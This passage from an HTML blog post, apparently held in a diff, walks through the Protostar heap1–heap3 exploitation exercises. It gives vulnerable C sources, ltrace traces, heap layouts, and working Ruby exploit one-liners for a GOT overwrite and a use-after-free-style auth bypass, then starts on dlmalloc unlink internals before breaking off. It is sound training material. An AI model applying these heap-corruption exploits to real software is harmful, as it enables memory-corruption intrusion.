+</span><span class='line'>(8) 0x0804a010: i1-name-control
+</span><span class='line'>(8) 0x0804a018: i1-name             # AAAAAAAA
+</span><span class='line'>
+</span><span class='line'>(8) 0x0804a020: i2-control          # AAAAAAAA
+</span><span class='line'>(4) 0x0804a028: i2-priority         # AAAA
+</span><span class='line'>(4) 0x0804a02c: i2-name(addr)       # [0x08049774].pack("V")
+</span><span class='line'>
+</span><span class='line'>(8) 0x0804a030: i2-name-control
+</span><span class='line'>(8) 0x0804a038: i2-name             # [0x08048494].pack("V")</span></code></pre></td></tr></table></div></figure>
+
+
+<p>The second <code>strcpy()</code> takes <code>i2-name(addr) = 0x08049774</code> and copies over there the <code>argv[2]</code> value.</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>user@protostar:~$ ltrace /opt/protostar/bin/heap1 $(ruby -e 'print "A" * 20 + [0x08049774].pack("V")') $(ruby -e 'print [0x08048494].pack("V")')
+</span><span class='line'>__libc_start_main(0x80484b9, 3, 0xbffff824, 0x8048580, 0x8048570 &lt;unfinished ...>
+</span><span class='line'>malloc(8)                                                   = 0x0804a008
+</span><span class='line'>malloc(8)                                                   = 0x0804a018
+</span><span class='line'>malloc(8)                                                   = 0x0804a028
+</span><span class='line'>malloc(8)                                                   = 0x0804a038
+</span><span class='line'>strcpy(0x0804a018, "AAAAAAAAAAAAAAAAAAAAt\227\004\b")       = 0x0804a018
+</span><span class='line'>strcpy(0x08049774, "\224\204\004\b")                        = 0x08049774
+</span><span class='line'>puts("and that's a wrap folks!" &lt;unfinished ...>
+</span><span class='line'>time(NULL)                                                  = 1435153654
+</span><span class='line'>printf("and we have a winner @ %d\n", 1435153654and we have a winner @ 1435153654
+</span><span class='line'>)                                                                             = 34
+</span><span class='line'>&lt;... puts resumed> )                                                                                                          = 34
+</span><span class='line'>+++ exited (status 34) +++</span></code></pre></td></tr></table></div></figure>
+
+
+
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>user@protostar:~$ /opt/protostar/bin/heap1 $(ruby -e 'print "A" * 20 + [0x08049774].pack("V")') $(ruby -e 'print [0x08048494].pack("V")')
+</span><span class='line'>and we have a winner @ 1435149585</span></code></pre></td></tr></table></div></figure>
+
+
+<h2>Protostar Heap2</h2>
+
+<figure class='code'><figcaption><span>heap2.c </span></figcaption>
+<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+<span class='line-number'>29</span>
+<span class='line-number'>30</span>
+<span class='line-number'>31</span>
+<span class='line-number'>32</span>
+<span class='line-number'>33</span>
+<span class='line-number'>34</span>
+<span class='line-number'>35</span>
+<span class='line-number'>36</span>
+<span class='line-number'>37</span>
+<span class='line-number'>38</span>
+<span class='line-number'>39</span>
+<span class='line-number'>40</span>
+<span class='line-number'>41</span>
+<span class='line-number'>42</span>
+<span class='line-number'>43</span>
+<span class='line-number'>44</span>
+<span class='line-number'>45</span>
+<span class='line-number'>46</span>
+</pre></td><td class='code'><pre><code class='c'><span class='line'>
+</span><span class='line'><span class="cp">#include &lt;stdlib.h&gt;</span>
+</span><span class='line'><span class="cp">#include &lt;unistd.h&gt;</span>
+</span><span class='line'><span class="cp">#include &lt;string.h&gt;</span>
+</span><span class='line'><span class="cp">#include &lt;sys/types.h&gt;</span>
+</span><span class='line'><span class="cp">#include &lt;stdio.h&gt;</span>
+</span><span class='line'>
+</span><span class='line'><span class="k">struct</span> <span class="n">auth</span> <span class="p">{</span>
+</span><span class='line'>  <span class="kt">char</span> <span class="n">name</span><span class="p">[</span><span class="mi">32</span><span class="p">];</span>
+</span><span class='line'>  <span class="kt">int</span> <span class="n">auth</span><span class="p">;</span>
+</span><span class='line'><span class="p">};</span>
+</span><span class='line'>
+</span><span class='line'><span class="k">struct</span> <span class="n">auth</span> <span class="o">*</span><span class="n">auth</span><span class="p">;</span>
+</span><span class='line'><span class="kt">char</span> <span class="o">*</span><span class="n">service</span><span class="p">;</span>
+</span><span class='line'>
+</span><span class='line'><span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">)</span>
+</span><span class='line'><span class="p">{</span>
+</span><span class='line'>  <span class="kt">char</span> <span class="n">line</span><span class="p">[</span><span class="mi">128</span><span class="p">];</span>
+</span><span class='line'>
+</span><span class='line'>  <span class="k">while</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
+</span><span class='line'>      <span class="n">printf</span><span class="p">(</span><span class="s">&quot;[ auth = %p, service = %p ]</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">auth</span><span class="p">,</span> <span class="n">service</span><span class="p">);</span>
+</span><span class='line'>
+</span><span class='line'>      <span class="k">if</span><span class="p">(</span><span class="n">fgets</span><span class="p">(</span><span class="n">line</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">line</span><span class="p">),</span> <span class="n">stdin</span><span class="p">)</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span> <span class="k">break</span><span class="p">;</span>
+</span><span class='line'>
+</span><span class='line'>      <span class="k">if</span><span class="p">(</span><span class="n">strncmp</span><span class="p">(</span><span class="n">line</span><span class="p">,</span> <span class="s">&quot;auth &quot;</span><span class="p">,</span> <span class="mi">5</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+</span><span class='line'>          <span class="n">auth</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="k">sizeof</span><span class="p">(</span><span class="n">auth</span><span class="p">));</span>
+</span><span class='line'>          <span class="n">memset</span><span class="p">(</span><span class="n">auth</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">auth</span><span class="p">));</span>
+</span><span class='line'>          <span class="k">if</span><span class="p">(</span><span class="n">strlen</span><span class="p">(</span><span class="n">line</span> <span class="o">+</span> <span class="mi">5</span><span class="p">)</span> <span class="o">&lt;</span> <span class="mi">31</span><span class="p">)</span> <span class="p">{</span>
+</span><span class='line'>              <span class="n">strcpy</span><span class="p">(</span><span class="n">auth</span><span class="o">-&gt;</span><span class="n">name</span><span class="p">,</span> <span class="n">line</span> <span class="o">+</span> <span class="mi">5</span><span class="p">);</span>
+</span><span class='line'>          <span class="p">}</span>
+</span><span class='line'>      <span class="p">}</span>
+</span><span class='line'>      <span class="k">if</span><span class="p">(</span><span class="n">strncmp</span><span class="p">(</span><span class="n">line</span><span class="p">,</span> <span class="s">&quot;reset&quot;</span><span class="p">,</span> <span class="mi">5</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+</span><span class='line'>          <span class="n">free</span><span class="p">(</span><span class="n">auth</span><span class="p">);</span>
+</span><span class='line'>      <span class="p">}</span>
+</span><span class='line'>      <span class="k">if</span><span class="p">(</span><span class="n">strncmp</span><span class="p">(</span><span class="n">line</span><span class="p">,</span> <span class="s">&quot;service&quot;</span><span class="p">,</span> <span class="mi">6</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+</span><span class='line'>          <span class="n">service</span> <span class="o">=</span> <span class="n">strdup</span><span class="p">(</span><span class="n">line</span> <span class="o">+</span> <span class="mi">7</span><span class="p">);</span>
+</span><span class='line'>      <span class="p">}</span>
+</span><span class='line'>      <span class="k">if</span><span class="p">(</span><span class="n">strncmp</span><span class="p">(</span><span class="n">line</span><span class="p">,</span> <span class="s">&quot;login&quot;</span><span class="p">,</span> <span class="mi">5</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+</span><span class='line'>          <span class="k">if</span><span class="p">(</span><span class="n">auth</span><span class="o">-&gt;</span><span class="n">auth</span><span class="p">)</span> <span class="p">{</span>
+</span><span class='line'>              <span class="n">printf</span><span class="p">(</span><span class="s">&quot;you have logged in already!</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
+</span><span class='line'>          <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+</span><span class='line'>              <span class="n">printf</span><span class="p">(</span><span class="s">&quot;please enter your password</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
+</span><span class='line'>          <span class="p">}</span>
+</span><span class='line'>      <span class="p">}</span>
+</span><span class='line'>  <span class="p">}</span>
+</span><span class='line'><span class="p">}</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Running the binary:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>user@protostar:~$ /opt/protostar/bin/heap2 
+</span><span class='line'>[ auth = (nil), service = (nil) ]
+</span><span class='line'>auth 1234
+</span><span class='line'>[ auth = 0x804c008, service = (nil) ]
+</span><span class='line'>service 5678
+</span><span class='line'>[ auth = 0x804c008, service = 0x804c018 ]
+</span><span class='line'>login
+</span><span class='line'>please enter your password
+</span><span class='line'>[ auth = 0x804c008, service = 0x804c018 ]</span></code></pre></td></tr></table></div></figure>
+
+
+<p>This is strange, the <code>service</code> variable is allocated at <code>0x0804c018</code>, but
+obviously we cannot have the following heap chucks:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>(08) 0x0804c000: auth-control
+</span><span class='line'>(32) 0x0804c008: auth-name
+</span><span class='line'>(04) 0x0804c028: auth-auth
+</span><span class='line'>
+</span><span class='line'>(08) 0x0804c010: service-control
+</span><span class='line'>(xx) 0x0804c018: service</span></code></pre></td></tr></table></div></figure>
+
+
+<p>There should be <code>sizeof(struct auth) = 32+4</code> instead of <code>sizeof(auth) = 4</code> and in
+our buggy code we allocated only four bytes of memory:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>auth = malloc(sizeof(auth));
+</span><span class='line'>memset(auth, 0, sizeof(auth));</span></code></pre></td></tr></table></div></figure>
+
+
+<p>This is very simple <code>Use-After-Free</code> vulnerability. We need to write something
+to <code>auth-auth</code>, after <code>0x0804c028-0x0804c018 = 16</code> bytes.</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+<span class='line-number'>29</span>
+<span class='line-number'>30</span>
+<span class='line-number'>31</span>
+<span class='line-number'>32</span>
+<span class='line-number'>33</span>
+<span class='line-number'>34</span>
+<span class='line-number'>35</span>
+<span class='line-number'>36</span>
+<span class='line-number'>37</span>
+<span class='line-number'>38</span>
+<span class='line-number'>39</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>user@protostar:~$ ltrace /opt/protostar/bin/heap2
+</span><span class='line'>__libc_start_main(0x8048934, 1, 0xbffff864, 0x804acc0, 0x804acb0 &lt;unfinished ...>
+</span><span class='line'>printf("[ auth = %p, service = %p ]\n", (nil), (nil)[ auth = (nil), service = (nil) ]
+</span><span class='line'>)                                                                         = 34
+</span><span class='line'>fgets(auth A
+</span><span class='line'>"auth A\n", 128, 0xb7fd8420)                                                                                            = 0xbffff730
+</span><span class='line'>strncmp("auth A\n", "auth ", 5)                                                                                               = 0
+</span><span class='line'>sysconf(30, 0, 0xb7fe1b28, 1, 0)                                                                                              = 4096
+</span><span class='line'>sbrk(4096)                                                                                                                    = 0x0804c000
+</span><span class='line'>sbrk(0)                                                                                                                       = 0x0804d000
+</span><span class='line'>memset(0x0804c008, '\000', 4)                                                                                                 = 0x0804c008
+</span><span class='line'>strlen("A\n")                                                                                                                 = 2
+</span><span class='line'>strcpy(0x0804c008, "A\n")                                                                                                     = 0x0804c008
+</span><span class='line'>strncmp("auth A\n", "reset", 5)                                                                                               = -17
+</span><span class='line'>strncmp("auth A\n", "service", 6)                                                                                             = -18
+</span><span class='line'>strncmp("auth A\n", "login", 5)                                                                                               = -11
+</span><span class='line'>printf("[ auth = %p, service = %p ]\n", 0x804c008, (nil)[ auth = 0x804c008, service = (nil) ]
+</span><span class='line'>)                                                                     = 38
+</span><span class='line'>fgets(service AAAAAAAAAAAAAAA
+</span><span class='line'>"service AAAAAAAAAAAAAAA\n", 128, 0xb7fd8420)                                                                           = 0xbffff730
+</span><span class='line'>strncmp("service AAAAAAAAAAAAAAA\n", "auth ", 5)                                                                              = 18
+</span><span class='line'>strncmp("service AAAAAAAAAAAAAAA\n", "reset", 5)                                                                              = 1
+</span><span class='line'>strncmp("service AAAAAAAAAAAAAAA\n", "service", 6)                                                                            = 0
+</span><span class='line'>strdup(" AAAAAAAAAAAAAAA\n")                                                                                                  = 0x0804c018
+</span><span class='line'>strncmp("service AAAAAAAAAAAAAAA\n", "login", 5)                                                                              = 7
+</span><span class='line'>printf("[ auth = %p, service = %p ]\n", 0x804c008, 0x804c018[ auth = 0x804c008, service = 0x804c018 ]
+</span><span class='line'>)                                                                 = 42
+</span><span class='line'>fgets(login
+</span><span class='line'>"login\n", 128, 0xb7fd8420)                                                                                             = 0xbffff730
+</span><span class='line'>strncmp("login\n", "auth ", 5)                                                                                                = 11
+</span><span class='line'>strncmp("login\n", "reset", 5)                                                                                                = -6
+</span><span class='line'>strncmp("login\n", "service", 6)                                                                                              = -7
+</span><span class='line'>strncmp("login\n", "login", 5)                                                                                                = 0
+</span><span class='line'>puts("you have logged in already!"you have logged in already!
+</span><span class='line'>)                                                                                           = 28
+</span><span class='line'>printf("[ auth = %p, service = %p ]\n", 0x804c008, 0x804c018[ auth = 0x804c008, service = 0x804c018 ]
+</span><span class='line'>)                                                                 = 42
+</span><span class='line'>fgets("login\n", 128, 0xb7fd8420)                                                                                             = NULL
+</span><span class='line'>+++ exited (status 0) +++</span></code></pre></td></tr></table></div></figure>
+
+
+<p>As we can see above, we sent 15 character + newline.</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>user@protostar:~$ /opt/protostar/bin/heap2 
+</span><span class='line'>[ auth = (nil), service = (nil) ]
+</span><span class='line'>auth A
+</span><span class='line'>[ auth = 0x804c008, service = (nil) ]
+</span><span class='line'>service AAAAAAAAAAAAAAA
+</span><span class='line'>[ auth = 0x804c008, service = 0x804c018 ]
+</span><span class='line'>login
+</span><span class='line'>you have logged in already!
+</span><span class='line'>[ auth = 0x804c008, service = 0x804c018 ]
+</span><span class='line'>
+</span><span class='line'>user@protostar:~$ ruby -e 'puts "auth A"; puts "service " + "A" * 15; puts "login"' | /opt/protostar/bin/heap2 
+</span><span class='line'>[ auth = (nil), service = (nil) ]
+</span><span class='line'>[ auth = 0x804c008, service = (nil) ]
+</span><span class='line'>[ auth = 0x804c008, service = 0x804c018 ]
+</span><span class='line'>you have logged in already!
+</span><span class='line'>[ auth = 0x804c008, service = 0x804c018 ]</span></code></pre></td></tr></table></div></figure>
+
+
+<h2>Protostar Heap3</h2>
+
+<p>This level introduces old <code>Doug Lea Malloc</code> version, which is statically linked with <code>heap3</code> binary.</p>
+
+<figure class='code'><figcaption><span>heap3.c </span></figcaption>
+<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+<span class='line-number'>29</span>
+</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="cp">#include &lt;stdlib.h&gt;</span>
+</span><span class='line'><span class="cp">#include &lt;unistd.h&gt;</span>
+</span><span class='line'><span class="cp">#include &lt;string.h&gt;</span>
+</span><span class='line'><span class="cp">#include &lt;sys/types.h&gt;</span>
+</span><span class='line'><span class="cp">#include &lt;stdio.h&gt;</span>
+</span><span class='line'>
+</span><span class='line'><span class="kt">void</span> <span class="nf">winner</span><span class="p">()</span>
+</span><span class='line'><span class="p">{</span>
+</span><span class='line'>  <span class="n">printf</span><span class="p">(</span><span class="s">&quot;that wasn&#39;t too bad now, was it? @ %d</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">time</span><span class="p">(</span><span class="nb">NULL</span><span class="p">));</span>
+</span><span class='line'><span class="p">}</span>
+</span><span class='line'>
+</span><span class='line'><span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">)</span>
+</span><span class='line'><span class="p">{</span>
+</span><span class='line'>  <span class="kt">char</span> <span class="o">*</span><span class="n">a</span><span class="p">,</span> <span class="o">*</span><span class="n">b</span><span class="p">,</span> <span class="o">*</span><span class="n">c</span><span class="p">;</span>
+</span><span class='line'>
+</span><span class='line'>  <span class="n">a</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="mi">32</span><span class="p">);</span>
+</span><span class='line'>  <span class="n">b</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="mi">32</span><span class="p">);</span>
+</span><span class='line'>  <span class="n">c</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="mi">32</span><span class="p">);</span>
+</span><span class='line'>
+</span><span class='line'>  <span class="n">strcpy</span><span class="p">(</span><span class="n">a</span><span class="p">,</span> <span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>
+</span><span class='line'>  <span class="n">strcpy</span><span class="p">(</span><span class="n">b</span><span class="p">,</span> <span class="n">argv</span><span class="p">[</span><span class="mi">2</span><span class="p">]);</span>
+</span><span class='line'>  <span class="n">strcpy</span><span class="p">(</span><span class="n">c</span><span class="p">,</span> <span class="n">argv</span><span class="p">[</span><span class="mi">3</span><span class="p">]);</span>
+</span><span class='line'>
+</span><span class='line'>  <span class="n">free</span><span class="p">(</span><span class="n">c</span><span class="p">);</span>
+</span><span class='line'>  <span class="n">free</span><span class="p">(</span><span class="n">b</span><span class="p">);</span>
+</span><span class='line'>  <span class="n">free</span><span class="p">(</span><span class="n">a</span><span class="p">);</span>
+</span><span class='line'>
+</span><span class='line'>  <span class="n">printf</span><span class="p">(</span><span class="s">&quot;dynamite failed?</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
+</span><span class='line'><span class="p">}</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>user@protostar:~$ ltrace /opt/protostar/bin/heap3 1 2 3
+</span><span class='line'>__libc_start_main(0x8048889, 4, 0xbffff854, 0x804ab50, 0x804ab40 &lt;unfinished ...>
+</span><span class='line'>sysconf(30, 0xb7ffeff4, 0xb7e9abb8, 1, 0xbffff71c)             = 4096
+</span><span class='line'>sbrk(4096)                                                     = 0x0804c000
+</span><span class='line'>sbrk(0)                                                        = 0x0804d000
+</span><span class='line'>strcpy(0x0804c008, "1")                                        = 0x0804c008
+</span><span class='line'>strcpy(0x0804c030, "2")                                        = 0x0804c030
+</span><span class='line'>strcpy(0x0804c058, "3")                                        = 0x0804c058
+</span><span class='line'>puts("dynamite failed?"dynamite failed?
+</span><span class='line'>)                                                              = 17
+</span><span class='line'>+++ exited (status 17) +++</span></code></pre></td></tr></table></div></figure>
+
+
+<p>We have three chunks at the appropriate addresses:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>(08) 0x0804c000: a-control
+</span><span class='line'>(32) 0x0804c008: a
+</span><span class='line'>
+</span><span class='line'>(08) 0x0804c000: b-control
+</span><span class='line'>(32) 0x0804c030: b
+</span><span class='line'>
+</span><span class='line'>(08) 0x0804c050: c-control
+</span><span class='line'>(32) 0x0804c058: c</span></code></pre></td></tr></table></div></figure>
+
+
+<p>There are a several great article about this topic, I recommend <a href="http://phrack.org/issues/57/8.html">Phrack 57/8</a>,
+<a href="http://phrack.org/issues/57/9.html">Phrack 57/9</a>, <a href="https://www.win.tue.nl/~aeb/linux/hh/hh-11.html">Hackers Hut</a> to
+explain the exploitation process in detail.</p>
+
+<p>The malloc chunk could be considered as the following structure:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>GNU C Library Implementation (used chunk):
+</span><span class='line'>
+</span><span class='line'>             +----------------------------------+
+</span><span class='line'>    chunk -> | prev_size                        |
+</span><span class='line'>             +----------------------------------+
+</span><span class='line'>             | size                         |M|P|
+</span><span class='line'>             +----------------------------------+
+</span><span class='line'>      mem -> | data                             |
+</span><span class='line'>             : ...                              :
+</span><span class='line'>             +----------------------------------+
+</span><span class='line'>nextchunk -> | prev_size ...                    |
+</span><span class='line'>             :                                  :</span></code></pre></td></tr></table></div></figure>
+
+
+
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>Once we free() the chunk:
+</span><span class='line'>
+</span><span class='line'>             +----------------------------------+
+</span><span class='line'>    chunk -> | prev_size                        |
+</span><span class='line'>             +----------------------------------+
+</span><span class='line'>             | size                         |M|P|
+</span><span class='line'>             +----------------------------------+
+</span><span class='line'>      mem -> | fd                               |
+</span><span class='line'>             +----------------------------------+
+</span><span class='line'>             | bk                               |
+</span><span class='line'>             +----------------------------------+
+</span><span class='line'>             | (old memory, can be zero bytes)  |
+</span><span class='line'>             :                                  :
+</span><span class='line'>
+</span><span class='line'>nextchunk -> | prev_size ...                    |
+</span><span class='line'>             :                                  :</span></code></pre></td></tr></table></div></figure>
+
+
+<p>It is useful to download the <a href="https://ftp.gnu.org/gnu/glibc/glibc-2.2.3.tar.gz">glibc 2.2.3</a> source code, we are
+interested, how is the <code>free()</code> implemented:</p>
+
+<figure class='code'><figcaption><span>malloc/malloc.c </span></figcaption>
+<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+<span class='line-number'>29</span>
+<span class='line-number'>30</span>
+<span class='line-number'>31</span>
+<span class='line-number'>32</span>
+<span class='line-number'>33</span>
+<span class='line-number'>34</span>
+<span class='line-number'>35</span>
+<span class='line-number'>36</span>
+<span class='line-number'>37</span>
+<span class='line-number'>38</span>
+<span class='line-number'>39</span>
+<span class='line-number'>40</span>
+</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="p">..</span>
+</span><span class='line'><span class="cp">#define unlink(P, BK, FD)                                                     \</span>
+</span><span class='line'><span class="cp">{                                                                             \</span>
+</span><span class='line'><span class="cp">  BK = P-&gt;bk;                                                                 \</span>
+</span><span class='line'><span class="cp">  FD = P-&gt;fd;                                                                 \</span>
+</span><span class='line'><span class="cp">  FD-&gt;bk = BK;                                                                \</span>
+</span><span class='line'><span class="cp">  BK-&gt;fd = FD;                                                                \</span>
+</span><span class='line'><span class="cp">}                                                                             \</span>
+</span><span class='line'><span class="cp">..</span>
+</span><span class='line'>  <span class="n">islr</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+</span><span class='line'>
+</span><span class='line'>  <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="p">(</span><span class="n">hd</span> <span class="o">&amp;</span> <span class="n">PREV_INUSE</span><span class="p">))</span>                    <span class="cm">/* consolidate backward */</span>
+</span><span class='line'>  <span class="p">{</span>
+</span><span class='line'>    <span class="n">prevsz</span> <span class="o">=</span> <span class="n">p</span><span class="o">-&gt;</span><span class="n">prev_size</span><span class="p">;</span>
